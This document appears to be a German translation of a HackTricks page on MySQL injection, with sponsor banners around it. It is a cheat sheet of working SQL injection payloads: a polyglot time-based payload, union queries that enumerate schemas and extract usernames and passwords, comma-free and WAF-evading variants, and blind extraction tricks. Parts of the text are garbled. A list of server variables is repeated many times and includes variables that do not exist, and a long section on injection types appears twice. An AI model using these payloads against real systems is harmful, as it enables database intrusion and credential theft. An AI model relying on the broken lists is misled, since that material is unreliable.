# MySQL-Injection

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? M√∂chten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder m√∂chten Sie Zugriff auf die **neueste Version von PEASS oder HackTricks als PDF herunterladen**? √úberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* **Treten Sie der** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das [hacktricks-Repository](https://github.com/carlospolop/hacktricks) und das [hacktricks-cloud-Repository](https://github.com/carlospolop/hacktricks-cloud) senden**.

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) ist die relevanteste Cybersicherheitsveranstaltung in **Spanien** und eine der wichtigsten in **Europa**. Mit **dem Ziel, technisches Wissen zu f√∂rdern**, ist dieser Kongress ein brodelnder Treffpunkt f√ºr Technologie- und Cybersicherheitsfachleute in jeder Disziplin.

{% embed url="https://www.rootedcon.com/" %}

## Kommentare
```sql
-- MYSQL Comment
# MYSQL Comment
/* MYSQL Comment */
/*! MYSQL Special SQL */
/*!32302 10*/ Comment for MySQL version 3.23.02
```
## Interessante Funktionen

### Mysql best√§tigen:
```
concat('a','b')
database()
version()
user()
system_user()
@@version
@@datadir
rand()
floor(2.9)
length(1)
count(1)
```
### N√ºtzliche Funktionen

The following functions can be useful when performing MySQL injection attacks:

Die folgenden Funktionen k√∂nnen n√ºtzlich sein, wenn Sie MySQL-Injektionsangriffe durchf√ºhren:

- `version()`: This function returns the version of the MySQL server.

- `user()`: This function returns the current username.

- `database()`: This function returns the name of the current database.

- `current_user()`: This function returns the current username and host.

- `schema()`: This function returns the name of the current database.

- `@@hostname`: This variable returns the hostname of the MySQL server.

- `@@datadir`: This variable returns the data directory of the MySQL server.

- `@@basedir`: This variable returns the base directory of the MySQL server.

- `@@version_compile_os`: This variable returns the operating system on which the MySQL server is compiled.

- `@@version`: This variable returns the version of the MySQL server.

- `@@global.version_compile_os`: This variable returns the operating system on which the MySQL server is compiled.

- `@@global.version`: This variable returns the version of the MySQL server.

- `@@global.datadir`: This variable returns the data directory of the MySQL server.

- `@@global.basedir`: This variable returns the base directory of the MySQL server.

- `@@global.hostname`: This variable returns the hostname of the MySQL server.

- `@@global.collation_server`: This variable returns the collation used by the MySQL server.

- `@@global.character_set_server`: This variable returns the character set used by the MySQL server.

- `@@global.character_set_database`: This variable returns the character set used by the current database.

- `@@global.character_set_connection`: This variable returns the character set used by the current connection.

- `@@global.character_set_results`: This variable returns the character set used for returning query results.

- `@@global.character_set_client`: This variable returns the character set used by the client.

- `@@global.character_set_filesystem`: This variable returns the character set used by the file system.

- `@@global.character_set_system`: This variable returns the character set used by the system.

- `@@global.character_set_server`: This variable returns the character set used by the server.

- `@@global.character_set_database`: This variable returns the character set used by the database.

- `@@global.character_set_connection`: This variable returns the character set used by the connection.

- `@@global.character_set_results`: This variable returns the character set used for query results.

- `@@global.character_set_client`: This variable returns the character set used by the client.

- `@@global.character_set_filesystem`: This variable returns the character set used by the file system.

- `@@global.character_set_system`: This variable returns the character set used by the system.

- `@@global.collation_server`: This variable returns the collation used by the server.

- `@@global.collation_database`: This variable returns the collation used by the database.

- `@@global.collation_connection`: This variable returns the collation used by the connection.

- `@@global.collation_results`: This variable returns the collation used for query results.

- `@@global.collation_client`: This variable returns the collation used by the client.

- `@@global.collation_filesystem`: This variable returns the collation used by the file system.

- `@@global.collation_system`: This variable returns the collation used by the system.

- `@@global.collation_server`: This variable returns the collation used by the server.

- `@@global.collation_database`: This variable returns the collation used by the database.

- `@@global.collation_connection`: This variable returns the collation used by the connection.

- `@@global.collation_results`: This variable returns the collation used for query results.

- `@@global.collation_client`: This variable returns the collation used by the client.

- `@@global.collation_filesystem`: This variable returns the collation used by the file system.

- `@@global.collation_system`: This variable returns the collation used by the system.
```sql
SELECT hex(database())
SELECT conv(hex(database()),16,10) # Hexadecimal -> Decimal
SELECT DECODE(ENCODE('cleartext', 'PWD'), 'PWD')# Encode() & decpde() returns only numbers
SELECT uncompress(compress(database())) #Compress & uncompress() returns only numbers
SELECT replace(database(),"r","R")
SELECT substr(database(),1,1)='r'
SELECT substring(database(),1,1)=0x72
SELECT ascii(substring(database(),1,1))=114
SELECT database()=char(114,101,120,116,101,115,116,101,114)
SELECT group_concat(<COLUMN>) FROM <TABLE>
SELECT group_concat(if(strcmp(table_schema,database()),table_name,null))
SELECT group_concat(CASE(table_schema)When(database())Then(table_name)END)
strcmp(),mid(),,ldap(),rdap(),left(),rigth(),instr(),sleep()
```
## Alle Injektionen

Injektionen sind eine der h√§ufigsten Sicherheitsl√ºcken in Webanwendungen. Sie treten auf, wenn nicht vertrauensw√ºrdige Daten in eine Anfrage oder Abfrage eingef√ºgt werden, wodurch ein Angreifer sch√§dlichen Code ausf√ºhren kann. In diesem Abschnitt werden verschiedene Arten von Injektionen behandelt, die bei MySQL-Datenbanken auftreten k√∂nnen.

### SQL-Injektion

Bei einer SQL-Injektion kann ein Angreifer sch√§dlichen SQL-Code in eine Anfrage einschleusen, um unerw√ºnschte Aktionen auszuf√ºhren. Dies kann dazu f√ºhren, dass Datenbanken kompromittiert, Informationen gestohlen oder sogar die gesamte Anwendung √ºbernommen wird.

#### Fehlerbasierte SQL-Injektion

Bei einer fehlerbasierten SQL-Injektion nutzt ein Angreifer Fehlermeldungen der Datenbank aus, um Informationen √ºber die Datenbankstruktur zu erhalten. Durch das gezielte Ausl√∂sen von Fehlern kann der Angreifer sensible Informationen wie Tabellennamen, Spaltennamen oder sogar Daten aus der Datenbank extrahieren.

#### Union-basierte SQL-Injektion

Bei einer union-basierten SQL-Injektion nutzt ein Angreifer die UNION-Abfrage in SQL aus, um Daten aus einer anderen Tabelle abzurufen. Durch das Hinzuf√ºgen von UNION-Abfragen kann der Angreifer Daten aus einer anderen Tabelle in die urspr√ºngliche Abfrage einf√ºgen und so vertrauliche Informationen erhalten.

#### Time-based SQL-Injektion

Bei einer time-based SQL-Injektion nutzt ein Angreifer die Verz√∂gerungsfunktionen der Datenbank aus, um Informationen zu extrahieren. Durch das Hinzuf√ºgen von Verz√∂gerungen in der SQL-Abfrage kann der Angreifer feststellen, ob bestimmte Bedingungen erf√ºllt sind oder nicht, und so schrittweise Informationen √ºber die Datenbank erhalten.

#### Blind SQL-Injektion

Bei einer Blind SQL-Injektion kann ein Angreifer keine direkten Fehlermeldungen oder Informationen aus der Datenbank erhalten. Stattdessen nutzt der Angreifer logische Bedingungen und Zeitverz√∂gerungen, um schrittweise Informationen zu extrahieren. Dies erfordert oft Geduld und Ausdauer, kann aber dennoch zu erfolgreichen Angriffen f√ºhren.

### Weitere Injektionen

Neben SQL-Injektionen gibt es auch andere Arten von Injektionen, die bei Webanwendungen auftreten k√∂nnen. Hier sind einige Beispiele:

#### OS-Injektion

Bei einer OS-Injektion kann ein Angreifer sch√§dlichen Code in das Betriebssystem einschleusen. Dies kann dazu f√ºhren, dass der Angreifer Befehle auf dem Server ausf√ºhrt, Dateien liest oder schreibt oder sogar das gesamte System √ºbernimmt.

#### LDAP-Injektion

Bei einer LDAP-Injektion kann ein Angreifer sch√§dlichen Code in eine LDAP-Anfrage einschleusen. Dadurch kann der Angreifer unerw√ºnschte Aktionen ausf√ºhren, wie z.B. das Auslesen oder √Ñndern von Daten in einem LDAP-Verzeichnis.

#### XML-Injektion

Bei einer XML-Injektion kann ein Angreifer sch√§dlichen Code in eine XML-Anfrage einschleusen. Dadurch kann der Angreifer unerw√ºnschte Aktionen ausf√ºhren, wie z.B. das Auslesen oder √Ñndern von Daten in einer XML-Datei.

#### XPath-Injektion

Bei einer XPath-Injektion kann ein Angreifer sch√§dlichen Code in eine XPath-Anfrage einschleusen. Dadurch kann der Angreifer unerw√ºnschte Aktionen ausf√ºhren, wie z.B. das Auslesen oder √Ñndern von Daten in einer XML-Datei, die XPath verwendet.

#### Command Injection

Bei einer Command Injection kann ein Angreifer sch√§dlichen Code in eine Befehlszeile einschleusen. Dadurch kann der Angreifer Befehle auf dem Server ausf√ºhren und unerw√ºnschte Aktionen durchf√ºhren.

#### Code Injection

Bei einer Code Injection kann ein Angreifer sch√§dlichen Code in eine Anwendung einschleusen. Dadurch kann der Angreifer die Kontrolle √ºber die Anwendung √ºbernehmen und unerw√ºnschte Aktionen ausf√ºhren.

#### Server-Side Template Injection (SSTI)

Bei einer Server-Side Template Injection kann ein Angreifer sch√§dlichen Code in ein Serverseitiges Template einschleusen. Dadurch kann der Angreifer die Kontrolle √ºber das Template √ºbernehmen und unerw√ºnschte Aktionen ausf√ºhren.

#### Client-Side Template Injection (CSTI)

Bei einer Client-Side Template Injection kann ein Angreifer sch√§dlichen Code in ein Clientseitiges Template einschleusen. Dadurch kann der Angreifer die Kontrolle √ºber das Template √ºbernehmen und unerw√ºnschte Aktionen ausf√ºhren.

#### Expression Language Injection (EL Injection)

Bei einer Expression Language Injection kann ein Angreifer sch√§dlichen Code in eine Expression Language-Anweisung einschleusen. Dadurch kann der Angreifer unerw√ºnschte Aktionen ausf√ºhren, wie z.B. das Auslesen oder √Ñndern von Daten in einer Webanwendung.

#### JavaScript Injection

Bei einer JavaScript-Injektion kann ein Angreifer sch√§dlichen JavaScript-Code in eine Webanwendung einschleusen. Dadurch kann der Angreifer unerw√ºnschte Aktionen ausf√ºhren, wie z.B. das Auslesen oder √Ñndern von Daten in der Anwendung oder das Umleiten des Benutzers auf eine b√∂sartige Website.

#### HTML Injection

Bei einer HTML-Injektion kann ein Angreifer sch√§dlichen HTML-Code in eine Webanwendung einschleusen. Dadurch kann der Angreifer unerw√ºnschte Aktionen ausf√ºhren, wie z.B. das Anzeigen von gef√§lschten Formularen oder das Umleiten des Benutzers auf eine b√∂sartige Website.

#### CSS Injection

Bei einer CSS-Injektion kann ein Angreifer sch√§dlichen CSS-Code in eine Webanwendung einschleusen. Dadurch kann der Angreifer das Aussehen der Anwendung √§ndern oder unerw√ºnschte Aktionen ausf√ºhren, wie z.B. das Auslesen von Daten √ºber Hintergrundbilder.

#### Server-Side Request Forgery (SSRF)

Bei einer Server-Side Request Forgery kann ein Angreifer die Anwendung dazu bringen, Anfragen an andere interne oder externe Ressourcen zu senden. Dadurch kann der Angreifer Informationen aus internen Netzwerken abrufen oder Angriffe auf externe Ressourcen durchf√ºhren.

#### Remote File Inclusion (RFI)

Bei einer Remote File Inclusion kann ein Angreifer sch√§dlichen Code von einer externen Quelle in eine Anwendung einschleusen. Dadurch kann der Angreifer die Kontrolle √ºber die Anwendung √ºbernehmen und unerw√ºnschte Aktionen ausf√ºhren.

#### Local File Inclusion (LFI)

Bei einer Local File Inclusion kann ein Angreifer lokale Dateien in eine Anwendung einschleusen. Dadurch kann der Angreifer vertrauliche Informationen auslesen oder sogar das gesamte System kompromittieren.

#### Path Traversal

Bei einem Path Traversal-Angriff kann ein Angreifer Dateien oder Verzeichnisse au√üerhalb des vorgesehenen Pfades einer Anwendung abrufen. Dadurch kann der Angreifer auf vertrauliche Informationen zugreifen oder sogar das gesamte System kompromittieren.

#### LDAP Injection

Bei einer LDAP-Injektion kann ein Angreifer sch√§dlichen Code in eine LDAP-Anfrage einschleusen. Dadurch kann der Angreifer unerw√ºnschte Aktionen ausf√ºhren, wie z.B. das Auslesen oder √Ñndern von Daten in einem LDAP-Verzeichnis.

#### XPath Injection

Bei einer XPath-Injektion kann ein Angreifer sch√§dlichen Code in eine XPath-Anfrage einschleusen. Dadurch kann der Angreifer unerw√ºnschte Aktionen ausf√ºhren, wie z.B. das Auslesen oder √Ñndern von Daten in einer XML-Datei, die XPath verwendet.

#### XXE (XML External Entity) Injection

Bei einer XXE-Injektion kann ein Angreifer sch√§dlichen Code in eine XML-Anfrage einschleusen. Dadurch kann der Angreifer unerw√ºnschte Aktionen ausf√ºhren, wie z.B. das Auslesen oder √Ñndern von Daten in einer XML-Datei oder das Ausf√ºhren von Remote-Code.

#### Server-Side Template Injection (SSTI)

Bei einer Server-Side Template Injection kann ein Angreifer sch√§dlichen Code in ein Serverseitiges Template einschleusen. Dadurch kann der Angreifer die Kontrolle √ºber das Template √ºbernehmen und unerw√ºnschte Aktionen ausf√ºhren.

#### Client-Side Template Injection (CSTI)

Bei einer Client-Side Template Injection kann ein Angreifer sch√§dlichen Code in ein Clientseitiges Template einschleusen. Dadurch kann der Angreifer die Kontrolle √ºber das Template √ºbernehmen und unerw√ºnschte Aktionen ausf√ºhren.

#### Expression Language Injection (EL Injection)

Bei einer Expression Language Injection kann ein Angreifer sch√§dlichen Code in eine Expression Language-Anweisung einschleusen. Dadurch kann der Angreifer unerw√ºnschte Aktionen ausf√ºhren, wie z.B. das Auslesen oder √Ñndern von Daten in einer Webanwendung.

#### JavaScript Injection

Bei einer JavaScript-Injektion kann ein Angreifer sch√§dlichen JavaScript-Code in eine Webanwendung einschleusen. Dadurch kann der Angreifer unerw√ºnschte Aktionen ausf√ºhren, wie z.B. das Auslesen oder √Ñndern von Daten in der Anwendung oder das Umleiten des Benutzers auf eine b√∂sartige Website.

#### HTML Injection

Bei einer HTML-Injektion kann ein Angreifer sch√§dlichen HTML-Code in eine Webanwendung einschleusen. Dadurch kann der Angreifer unerw√ºnschte Aktionen ausf√ºhren, wie z.B. das Anzeigen von gef√§lschten Formularen oder das Umleiten des Benutzers auf eine b√∂sartige Website.

#### CSS Injection

Bei einer CSS-Injektion kann ein Angreifer sch√§dlichen CSS-Code in eine Webanwendung einschleusen. Dadurch kann der Angreifer das Aussehen der Anwendung √§ndern oder unerw√ºnschte Aktionen ausf√ºhren, wie z.B. das Auslesen von Daten √ºber Hintergrundbilder.

#### Server-Side Request Forgery (SSRF)

Bei einer Server-Side Request Forgery kann ein Angreifer die Anwendung dazu bringen, Anfragen an andere interne oder externe Ressourcen zu senden. Dadurch kann der Angreifer Informationen aus internen Netzwerken abrufen oder Angriffe auf externe Ressourcen durchf√ºhren.

#### Remote File Inclusion (RFI)

Bei einer Remote File Inclusion kann ein Angreifer sch√§dlichen Code von einer externen Quelle in eine Anwendung einschleusen. Dadurch kann der Angreifer die Kontrolle √ºber die Anwendung √ºbernehmen und unerw√ºnschte Aktionen ausf√ºhren.

#### Local File Inclusion (LFI)

Bei einer Local File Inclusion kann ein Angreifer lokale Dateien in eine Anwendung einschleusen. Dadurch kann der Angreifer vertrauliche Informationen auslesen oder sogar das gesamte System kompromittieren.

#### Path Traversal

Bei einem Path Traversal-Angriff kann ein Angreifer Dateien oder Verzeichnisse au√üerhalb des vorgesehenen Pfades einer Anwendung abrufen. Dadurch kann der Angreifer auf vertrauliche Informationen zugreifen oder sogar das gesamte System kompromittieren.
```sql
SELECT * FROM some_table WHERE double_quotes = "IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/"
```
von [https://labs.detectify.com/2013/05/29/the-ultimate-sql-injection-payload/](https://labs.detectify.com/2013/05/29/the-ultimate-sql-injection-payload/)

## Ablauf

Denken Sie daran, dass Sie in "modernen" Versionen von **MySQL** "_**information\_schema.tables**_" durch "_**mysql.innodb\_table\_stats**_" ersetzen k√∂nnen (Dies k√∂nnte n√ºtzlich sein, um WAFs zu umgehen).
```sql
SELECT table_name FROM information_schema.tables WHERE table_schema=database();#Get name of the tables
SELECT column_name FROM information_schema.columns WHERE table_name="<TABLE_NAME>"; #Get name of the columns of the table
SELECT <COLUMN1>,<COLUMN2> FROM <TABLE_NAME>; #Get values
SELECT user FROM mysql.user WHERE file_priv='Y'; #Users with file privileges
```
### **Nur 1 Wert**

* `group_concat()`
* `Limit X,1`

### **Blind einer nach dem anderen**

* `substr(version(),X,1)='r'` oder `substring(version(),X,1)=0x70` oder `ascii(substr(version(),X,1))=112`
* `mid(version(),X,1)='5'`

### **Blind hinzuf√ºgen**

* `LPAD(version(),1...lenght(version()),'1')='asd'...`
* `RPAD(version(),1...lenght(version()),'1')='asd'...`
* `SELECT RIGHT(version(),1...lenght(version()))='asd'...`
* `SELECT LEFT(version(),1...lenght(version()))='asd'...`
* `SELECT INSTR('foobarbar', 'fo...')=1`

## Anzahl der Spalten erkennen

Mit einer einfachen ORDER
```
order by 1
order by 2
order by 3
...
order by XXX

UniOn SeLect 1
UniOn SeLect 1,2
UniOn SeLect 1,2,3
...
```
## MySQL Union-basiert

Die Union-basierte SQL-Injection ist eine Technik, bei der die UNION-Abfrage verwendet wird, um Daten aus einer anderen Tabelle abzurufen. Dieser Angriff erfolgt normalerweise √ºber Eingabeformulare oder URL-Parameter, bei denen die Benutzereingabe nicht ordnungsgem√§√ü validiert oder bereinigt wird.

### Union-basierte SQL-Injection erkennen

Um eine Union-basierte SQL-Injection zu erkennen, k√∂nnen Sie versuchen, die Anzahl der Spalten in der SELECT-Anweisung zu ermitteln. Sie k√∂nnen dies tun, indem Sie eine UNION-Abfrage mit einer anderen SELECT-Anweisung kombinieren und die Anzahl der zur√ºckgegebenen Spalten √ºberpr√ºfen. Wenn die Anzahl der Spalten √ºbereinstimmt, besteht m√∂glicherweise eine SQL-Injection.

### Union-basierte SQL-Injection ausnutzen

Um eine Union-basierte SQL-Injection auszunutzen, m√ºssen Sie die Anzahl der Spalten in der SELECT-Anweisung ermitteln und dann die Daten aus einer anderen Tabelle abrufen. Sie k√∂nnen dies tun, indem Sie die UNION-Abfrage verwenden und die erforderlichen Spaltennamen und Tabellennamen angeben.

### Beispiel

Angenommen, wir haben eine URL-Parameter `id`, der in einer SQL-Abfrage verwendet wird:

```
https://example.com/page?id=1
```

Wir k√∂nnen versuchen, eine Union-basierte SQL-Injection auszuf√ºhren, indem wir die Anzahl der Spalten ermitteln:

```
https://example.com/page?id=1 UNION SELECT 1,2,3
```

Wenn die Anzahl der Spalten √ºbereinstimmt, k√∂nnen wir die Daten aus einer anderen Tabelle abrufen:

```
https://example.com/page?id=1 UNION SELECT username, password FROM users
```

### Schutzma√ünahmen

Um Union-basierte SQL-Injections zu verhindern, sollten Sie immer eine ordnungsgem√§√üe Validierung und Bereinigung der Benutzereingaben durchf√ºhren. Verwenden Sie Parameterisierte Abfragen oder Prepared Statements, um sicherzustellen, dass die Benutzereingaben nicht direkt in die SQL-Abfrage eingef√ºgt werden.

### Weitere Ressourcen

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [MySQL UNION Syntax](https://dev.mysql.com/doc/refman/8.0/en/union.html)
```sql
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=...
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=...
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,data,0x7C)+fRoM+...
```
## SSRF

**Hier erfahren Sie verschiedene M√∂glichkeiten, wie Sie eine Mysql-Injektion missbrauchen k√∂nnen, um eine SSRF zu erhalten**. [**Hier**](mysql-ssrf.md)** finden Sie weitere Informationen dazu.**

## WAF-Bypass-Tricks

### Alternativen zu Information\_schema

Denken Sie daran, dass Sie in "modernen" Versionen von **MySQL** _**information\_schema.tables**_ durch _**mysql.innodb\_table\_stats**_ oder durch _**sys.x$schema\_flattened\_keys**_ oder durch **sys.schema\_table\_statistics** ersetzen k√∂nnen.

### MySQL-Injektion ohne Kommas

W√§hlen Sie 2 Spalten aus, ohne ein Komma zu verwenden ([https://security.stackexchange.com/questions/118332/how-make-sql-select-query-without-comma](https://security.stackexchange.com/questions/118332/how-make-sql-select-query-without-comma)):
```
-1' union select * from (select 1)UT1 JOIN (SELECT table_name FROM mysql.innodb_table_stats)UT2 on 1=1#
```
### Abrufen von Werten ohne Spaltennamen

Wenn Sie zu einem bestimmten Zeitpunkt den Namen der Tabelle kennen, aber nicht den Namen der Spalten in der Tabelle, k√∂nnen Sie versuchen herauszufinden, wie viele Spalten es gibt, indem Sie etwas √Ñhnliches ausf√ºhren:
```bash
# When a True is returned, you have found the number of columns
select (select "", "") = (SELECT * from demo limit 1);     # 2columns
select (select "", "", "") < (SELECT * from demo limit 1); # 3columns
```
Angenommen, es gibt 2 Spalten (wobei die erste die ID ist) und die andere die Flagge ist, k√∂nnen Sie versuchen, den Inhalt der Flagge durch Brute-Force zu ermitteln, indem Sie Zeichen f√ºr Zeichen ausprobieren:
```bash
# When True, you found the correct char and can start ruteforcing the next position
select (select 1, 'flaf') = (SELECT * from demo limit 1);
```
Mehr Informationen finden Sie unter [https://medium.com/@terjanq/blind-sql-injection-without-an-in-1e14ba1d4952](https://medium.com/@terjanq/blind-sql-injection-without-an-in-1e14ba1d4952)

### MySQL Geschichte

Sie k√∂nnen andere Ausf√ºhrungen innerhalb von MySQL sehen, indem Sie die Tabelle **sys.x$statement\_analysis** lesen.

### Alternative Versionen
```
mysql> select @@innodb_version;
mysql> select @@version;
mysql> select version();
```
## Weitere MYSQL-Injektionsanleitungen

* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)]

## Referenzen
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)


<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) ist die relevanteste Cybersicherheitsveranstaltung in **Spanien** und eine der wichtigsten in **Europa**. Mit **der Mission, technisches Wissen zu f√∂rdern**, ist dieser Kongress ein brodelnder Treffpunkt f√ºr Technologie- und Cybersicherheitsprofis in jeder Disziplin.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? M√∂chten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder m√∂chten Sie Zugriff auf die **neueste Version des PEASS oder HackTricks als PDF-Download** haben? √úberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* **Treten Sie der** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das [hacktricks repo](https://github.com/carlospolop/hacktricks) und [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)** einreichen.

</details>
